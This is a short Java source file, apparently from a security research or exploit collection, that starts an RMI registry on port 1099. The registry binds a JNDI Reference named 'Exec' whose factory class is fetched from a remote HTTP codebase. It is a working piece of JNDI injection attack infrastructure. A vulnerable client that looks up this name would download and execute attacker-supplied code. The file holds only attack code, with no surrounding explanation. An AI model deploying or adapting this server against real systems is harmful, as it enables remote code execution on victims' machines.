package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 */
public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exec", "jndi.Exec", "http://127.0.0.1:1234/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("Exec", wrapper);
        System.out.println("run in 1099");
    }
}
